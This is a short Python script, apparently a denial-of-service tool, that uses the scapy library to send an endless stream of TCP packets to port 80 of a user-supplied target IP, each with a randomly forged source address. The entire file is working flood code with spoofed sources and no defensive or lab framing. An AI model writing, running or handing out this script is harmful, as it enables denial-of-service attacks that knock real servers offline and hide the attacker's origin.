from scapy.all import *
import random

#source_IP = input("Enter the IP address of source: ")
target_IP = input("Enter the IP address of target: ")

source_port = int(input("Enter the source port no: "))

i = 1

while True:

    i1 = str(random.randint(1,254))
    i2 = str(random.randint(1,254))
    i3 = str(random.randint(1,254))
    i4 = str(random.randint(1,254))

    d = "."

    source_IP = i1+d+i2+d+i3+d+i4

    IP1 = IP(src=source_IP,dst=target_IP)
    TCP1 = TCP(sport = source_port, dport= 80)
    pkt = IP1/TCP1

    send(pkt, inter = .001)
    print("packet sent", i)
    i = i+1
